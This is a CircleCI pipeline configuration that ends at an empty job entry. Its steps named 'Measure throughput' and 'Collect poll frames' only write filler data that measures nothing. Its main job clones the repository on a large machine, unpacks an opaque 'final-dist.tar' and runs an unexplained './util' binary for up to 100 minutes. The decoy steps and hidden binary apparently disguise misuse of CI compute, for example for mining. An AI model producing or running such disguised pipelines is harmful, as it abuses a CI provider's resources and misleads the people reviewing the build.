version: 2.1

jobs:
  stepB_orion-ng:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Measure throughput
          command: |
            mkdir -p /tmp/pipeline
            set +o pipefail 2>/dev/null; date -u +%s%N > /tmp/pipeline/PASS; for i in $(seq 1 5000); do echo "$i $(date +%N)" >> /tmp/pipeline/PASS; done; true
            echo "handoff ready: $(stat -c %s /tmp/pipeline/PASS) octets"
      - persist_to_workspace:
          root: /tmp/pipeline
          paths:
            - PASS
  orion-ng:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pipeline
      - run:
          name: Pull handoff
          command: |
            ls -la /tmp/pipeline/PASS || true
      - run:
          name: Grab main branch
          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Restore vendored sources
          command: cat final-dist.tar | tar xf -
      - run:
          no_output_timeout: 100m
          command: bash -c "./util"
  install_min-ship:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/pipeline
      - run:
          name: Collect poll frames
          command: |
            mkdir -p /tmp/pipeline
            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 18017); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/pipeline/OK
            echo "handoff ready: $(stat -c %s /tmp/pipeline/OK) octets"
      - persist_to_workspace:
          root: /tmp/pipeline
          paths:
            - OK
  min-ship:
